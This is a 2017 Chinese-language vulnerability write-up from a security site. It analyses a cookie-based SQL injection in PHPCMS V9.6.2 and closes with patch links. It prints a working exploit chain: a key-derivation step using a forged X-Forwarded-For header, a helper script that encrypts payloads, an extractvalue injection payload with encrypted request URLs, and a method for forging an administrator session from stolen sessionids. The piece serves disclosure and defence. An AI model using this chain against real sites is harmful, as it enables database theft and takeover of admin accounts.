# 【技术分享】PHPCMS V9.6.2 SQL注入漏洞分析

阅读量 **565373**

|评论 **1**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2017-05-19 17:22:05

 **x**

##### 译文声明

本文是翻译文章，文章来源：安全客

译文仅供参考，具体内容表达以及含义原文为准。

****

作者：[ **0r3ak@0kee
Team**](http://bobao.360.cn/member/contribute?uid=2515404114)

投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿

**  
**

**传送门**

[**【漏洞分析】PHPCMS V9.6.1
任意文件读取漏洞分析（含PoC，已有补丁）**](http://bobao.360.cn/learning/detail/3805.html)

**  
**

**前言**

通过这篇文章的分析：<http://bobao.360.cn/learning/detail/3805.html> ，详细讲述了PHPCMS
V9.6.1文件读取漏洞的触发成因，当发现网站是phpcms并且成功利用任意文件读取漏洞读取时系统文件时是否可以进行下一步的利用，在phpcms的核心文件/caches/configs/system.php中存储了phpcms全站的加密密钥与全局的配置参数：

    
    
    'cookie_pre' => 'qErKa_', //Cookie 前缀，同一域名下安装多套系统时，请修改Cookie前缀
    'auth_key' => 'U6KnzDrhf6ZQ5Yt7izr0', //密钥

利用这个密钥可以对 phpcms传输的数据加解密，使用SkyWolf在PHPcms
9.6.2中挖掘到了一枚配合密钥利用的SQL注入漏洞，以下是详细过程与分析。

  

**Skywolf**

**SykWolf介绍**

什么是SkyWolf？SkyWolf是一款自动化灰盒审计系统，所谓灰盒审计，在日常对cms的代码审计中可以理解为白盒结合黑盒的安全测试，以PHP扩展形式加载，通过污染传递的方法污染程序整个执行流程，并对程序处理流程进行安全性分析。

Skywolf控制台地址：

<https://0kee.360.cn/skywolf/>

通过访问网站接口skywolf会主动的分析中间调用逻辑，来罗列出可疑的漏洞

告警处理：展示Skywolf发现业务已经触发的漏洞告警信息，点进去看到详细的漏洞信息：

可疑点：服务端数据库执行的可疑语句

调用栈：程序在执行这一次请求当中所调用的函数与代码文件物理路径、在文件中的行数。

  

**SQL注入漏洞分析**

当访问到phpcms的member接口：

    
    
    phpcmsv961_1/index.php?m=member

skywolf发出了相关告警：

详细分析如下：

在会员前台管理中心接口的继承父类foreground：

/phpcms/modules/member/index.php LINE 11

    
    
    class index extends foreground {
        private $times_db;
        function __construct() {
            parent::__construct();
            $this->http_user_agent = $_SERVER['HTTP_USER_AGENT'];
        }

这里继承了foreground，跟进去：

/phpcms/modules/member/classes/foreground.class.php line 19-38：

    
    
        /**
         * 判断用户是否已经登陆
         */
        final public function check_member() {
            $phpcms_auth = param::get_cookie('auth');
            if(ROUTE_M =='member' && ROUTE_C =='index' && in_array(ROUTE_A, array('login', 'register', 'mini','send_newmail'))) {
                if ($phpcms_auth && ROUTE_A != 'mini') {
                    showmessage(L('login_success', '', 'member'), 'index.php?m=member&c=index');
                } else {
                    return true;
                }
            } else {
                //判断是否存在auth cookie
                if ($phpcms_auth) {
                    $auth_key = $auth_key = get_auth_key('login');
                    list($userid, $password) = explode("t", sys_auth($phpcms_auth, 'DECODE', $auth_key));
                    //验证用户，获取用户信息
                    $this->memberinfo = $this->db->get_one(array('userid'=>$userid)); //注入点在这
                    if($this->memberinfo['islock']) exit('<h1>Bad Request!</h1>');
                    //获取用户模型信息
                    $this->db->set_model($this->memberinfo['modelid']);

首先看到这里是验证前台会员用户是否登录，验证方法是解析客户端的cookie_pre_auth参数：

    
    
    $phpcms_auth = param::get_cookie('auth’);

跟到get_cookie函数：

/phpcms/libs/classes/param.class.php LINE 107-116

    
    
        /**
         * 获取通过 set_cookie 设置的 cookie 变量 
         * @param string $var 变量名
         * @param string $default 默认值 
         * @return mixed 成功则返回cookie 值，否则返回 false
         */
        public static function get_cookie($var, $default = '') {
            $var = pc_base::load_config('system','cookie_pre').$var;
            $value = isset($_COOKIE[$var]) ? sys_auth($_COOKIE[$var], 'DECODE') : $default;
            if(in_array($var,array('_userid','userid','siteid','_groupid','_roleid'))) {
                $value = intval($value);
            } elseif(in_array($var,array('_username','username','_nickname','admin_username','sys_lang'))) { //  site_model auth
                $value = safe_replace($value);
            }
            return $value;
        }

首先读取system.php（网站全局配置./caches/configs/system.php）中的配置参数cookie_pre，也就是网站默认随机分配的cookie前缀，然后再读取到客户端cookie中的cookie_pre_auth值放入sys_auth中解密，那么客户端的cookie_pre_auth应该是经过加密处理后的，有了这些信息后get_cookie先放到这里往下走到get_auth_key：

    
    
    $auth_key = $auth_key = get_auth_key('login');
                    list($userid, $password) = explode("t", sys_auth($phpcms_auth, 'DECODE', $auth_key));
                    //验证用户，获取用户信息
                    $this->memberinfo = $this->db->get_one(array('userid'=>$userid));

这里咱们看到DECODE用到的key是$auth_key，而$auth_key又是通过get_auth_key('login’)获得的，再跟进get_auth_key：

./phpcms/libs/functions/global.func.php LINE 1601-1611:

    
    
    /**
    * 生成验证key
    * @param $prefix   参数
    * @param $suffix   参数
    */
    function get_auth_key($prefix,$suffix="") {
        if($prefix=='login'){
            $pc_auth_key = md5(pc_base::load_config('system','auth_key').ip());
        }else if($prefix=='email'){
            $pc_auth_key = md5(pc_base::load_config('system','auth_key'));
        }else{
            $pc_auth_key = md5(pc_base::load_config('system','auth_key').$suffix);
        }
        $authkey = md5($prefix.$pc_auth_key);
        return $authkey;
    }

可以看到这个$prefix即是外部传入的login，满足$prefix==‘login’后开始拼接客户端ip地址再对值进行md5加密，发现ip()是可以伪造的：

    
    
    function ip() {
        if(getenv('HTTP_CLIENT_IP') && strcasecmp(getenv('HTTP_CLIENT_IP'), 'unknown')) {
            $ip = getenv('HTTP_CLIENT_IP');
        } elseif(getenv('HTTP_X_FORWARDED_FOR') && strcasecmp(getenv('HTTP_X_FORWARDED_FOR'), 'unknown')) {
            $ip = getenv('HTTP_X_FORWARDED_FOR');
        } elseif(getenv('REMOTE_ADDR') && strcasecmp(getenv('REMOTE_ADDR'), 'unknown')) {
            $ip = getenv('REMOTE_ADDR');
        } elseif(isset($_SERVER['REMOTE_ADDR']) && $_SERVER['REMOTE_ADDR'] && strcasecmp($_SERVER['REMOTE_ADDR'], 'unknown')) {
            $ip = $_SERVER['REMOTE_ADDR'];
        }
        return preg_match ( '/[d.]{7,15}/', $ip, $matches ) ? $matches [0] : '';
    }

最后得到的md5值就是sys_auth($phpcms_auth, 'DECODE',
$auth_key)的解密key了，这样来分析的话payload就是经过了两次加密，完全无视任何第三方防御。

加密流程：

  

**漏洞利用**

利用方式就简单了：

通过任意文件读取获取到全局配置文件的auth_key值：

首先执行get_auth_key加密，在代码中输出$authkey = md5($prefix.$pc_auth_key)的值：

    
    
    function get_auth_key($prefix,$suffix="") {
        if($prefix=='login'){
            $pc_auth_key = md5(pc_base::load_config('system','auth_key').ip());
        }else if($prefix=='email'){
            $pc_auth_key = md5(pc_base::load_config('system','auth_key'));
        }else{
            $pc_auth_key = md5(pc_base::load_config('system','auth_key').$suffix);
        }
        $authkey = md5($prefix.$pc_auth_key);
        echo $authkey;
        exit();
        return $authkey;
    }

方便测试，IP参数伪造为X-Forwarded-For: 123.59.214.3，输出了$authkey后直接exit了：

    
    
    e58cb4eb9cc211f7b0fc070d428438de

然后把phpcms关键的加解密函数sys_auth单独写到某个php文件里面：

sys_auth_key.php:

    
    
    <?php
    /**
    * 字符串加密、解密函数
    *
    *
    * @param    string    $txt        字符串
    * @param    string    $operation    ENCODE为加密，DECODE为解密，可选参数，默认为ENCODE，
    * @param    string    $key        密钥：数字、字母、下划线
    * @param    string    $expiry        过期时间
    * @return    string
    */
    function sys_auth($string, $operation = 'ENCODE', $key = '', $expiry = 0) {
        $ckey_length = 4;
        $key = md5($key != '' ? $key : '');
        $keya = md5(substr($key, 0, 16));
        $keyb = md5(substr($key, 16, 16));
        $keyc = $ckey_length ? ($operation == 'DECODE' ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : '';
        $cryptkey = $keya.md5($keya.$keyc);
        $key_length = strlen($cryptkey);
        $string = $operation == 'DECODE' ? base64_decode(strtr(substr($string, $ckey_length), '-_', '+/')) : sprintf('%010d', $expiry ? $expiry + time() : 0).substr(md5($string.$keyb), 0, 16).$string;
        $string_length = strlen($string);
        $result = '';
        $box = range(0, 255);
        $rndkey = array();
        for($i = 0; $i <= 255; $i++) {
            $rndkey[$i] = ord($cryptkey[$i % $key_length]);
        }
        for($j = $i = 0; $i < 256; $i++) {
            $j = ($j + $box[$i] + $rndkey[$i]) % 256;
            $tmp = $box[$i];
            $box[$i] = $box[$j];
            $box[$j] = $tmp;
        }
        for($a = $j = $i = 0; $i < $string_length; $i++) {
            $a = ($a + 1) % 256;
            $j = ($j + $box[$a]) % 256;
            $tmp = $box[$a];
            $box[$a] = $box[$j];
            $box[$j] = $tmp;
            $result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));
        }
        if($operation == 'DECODE') {
            if((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() > 0) && substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16)) {
                return substr($result, 26);
            } else {
                return '';
            }
        } else {
            return $keyc.rtrim(strtr(base64_encode($result), '+/', '-_'), '=');
        }
    }
    $sql = $_GET['sql'];
    $key = $_GET['key'];
    echo sys_auth($sql,'ENCODE',$key);
    ?>

带入$authkey与sqli payload：

第一次加密：

    
    
    http://127.0.0.1/dashboard/sys_auth_key.php?sql=1%27%20and%20%28extractvalue%281%2Cconcat%280x7e%2C%28select%20user%28%29%29%2C0x7e%29%29%29%3B%23%5Ctokee&key=e58cb4eb9cc211f7b0fc070d428438de

第二次加密：

    
    
    http://127.0.0.1/dashboard/sys_auth_key.php?sql=b5a4XCOdNpHwEb7nT4CUVMjUkE_cO9B7umiy5--PEK9R094s0L-dvb0HVCB5RUf1SlGkbDbu7HS6lL0mgrx8CGHWjG3m01zuIiyM5dbJ6D0lXZoZZvjOpIXlwTx_30M&key=exbsh7iuTSQsEcwLBcnB
    5cb5c0FCT6xz4xz7T1WONsQUFmoD3r0s8EkbTGyKIcnGDJsFO8g8fqAsJLu7_FuzHdJSsyxf7RL1jzO0Lvpq_3bzvfxOB6RRNEr938TYOwW3-QrF4JevCrf8taCsSuwK1FN6hwWf2s1AQDoXc2RL6SlZ-YwM3msW7vafcw5Vmxq7cPp3NSap1SV7l5h8gdGbm0HxiI_AmC4OTrFf

然后带入到auth中里面去访问member接口：

  

**伪造session进入后台**

众所周知，通过sql注入得到的phpcms的管理员密码是无法破解出来的，具体加密啊算法：

/phpcms/libs/functions/global.func.php LINE 1248

    
    
    /**
    * 对用户的密码进行加密
    * @param $password
    * @param $encrypt //传入加密串，在修改密码时做认证
    * @return array/password
    */
    function password($password, $encrypt='') {
        $pwd = array();
        $pwd['encrypt'] =  $encrypt ? $encrypt : create_randomstr();
        $pwd['password'] = md5(md5(trim($password)).$pwd['encrypt']);
        return $encrypt ? $pwd['password'] : $pwd;
    }

简单来说就是把明文密码做md5加密再连接上encrypt值（encrypt是创建用户的时候随机分配的字符串），再做一次md5加密，这样就很难解密了。

然而phpcms一直存在一处问题就是管理员登陆后台会将服务端的session值保存在数据库中，通过注入可以获取到session值来伪造访问后台页面，具体配置在system.php中：

    
    
    <?php
    return array(
    //网站路径
    'web_path' => '/phpcmsv961/',
    //Session配置
    'session_storage' => 'mysql',
    'session_ttl' => 1800,
    'session_savepath' => CACHE_PATH.'sessions/',
    'session_n' => 0,
    //Cookie配置
    'cookie_domain' => '', //Cookie 作用域
    'cookie_path' => '', //Cookie 作用路径
    'cookie_pre' => 'qErKa_', //Cookie 前缀，同一域名下安装多套系统时，请修改Cookie前缀
    'cookie_ttl' => 0, //Cookie 生命周期，0 表示随浏览器进程

mysql存储方式，session有效期为30分钟。

/phpcms/libs/classes/session_mysql.class.php

    
    
    /** 
    * 删除指定的session_id
    * 
    * @param $id session
    * @return bool
    */
        public function destroy($id) {
            return $this->db->delete(array('sessionid'=>$id));
        }
    /**
    * 删除过期的 session
    * 
    * @param $maxlifetime 存活期时间
    * @return bool
    */
       public function gc($maxlifetime) {
            $expiretime = SYS_TIME - $maxlifetime;
            return $this->db->delete("`lastvisit`<$expiretime");
        }
    }

只要触发了gc或destroy函数就会删除数据库中的session值，当管理员重新登陆后台后才重新生成session插入数据库中。

session数据库存放位置：

从mysql日志中分析可知：当管理员登陆后台会插入新的session到v9_session表中，每次后台操作都会进行这样的操作，使数据库中的sessionid保持最新，但是值不变。

在管理员登陆后台并且在未注销的前提下是可以通过获取管理员session值来伪造登陆的，限于篇幅，注入过程不再细说，这里直接上图：

得到sessionid，在得到这个参数后还需要一个值，就是pc_hash值，这个值在后台是个随机数，作者是想防止越权以及csrf而设计的，然而对于获取到了后台权限的我们只是一个摆设，下面直接提交数据包访问控制台首页：

  

**修复方案**

最新版本的phpcmsv9.6.3都已经修复了任意文件读取漏洞与sql注入点，可以下载最新版的补丁进行防护：

**UTF8：**

<http://download.phpcms.cn/v9/9.0/patch/utf8/patch_20170503_20170515_UTF8.zip>

**gbk:**

<http://download.phpcms.cn/v9/9.0/patch/gbk/patch_20170503_20170515_GBK.zip>

  

**传送门**

* * *

**[【漏洞分析】PHPCMS V9.6.1
任意文件读取漏洞分析（含PoC，已有补丁）](http://bobao.360.cn/learning/detail/3805.html)**

本文翻译自安全客 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **0keeTeam** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/86134](/post/id/86134)

安全客 - 有思想的安全新媒体

本文转载自: [安全客]()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [安全知识](/tag/安全知识)

 **+1** __6赞

 __收藏

![](https://p5.ssl.qhmsg.com/dm/200_200_100/t00df551a583a87f4e9.jpg) 0keeTeam

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

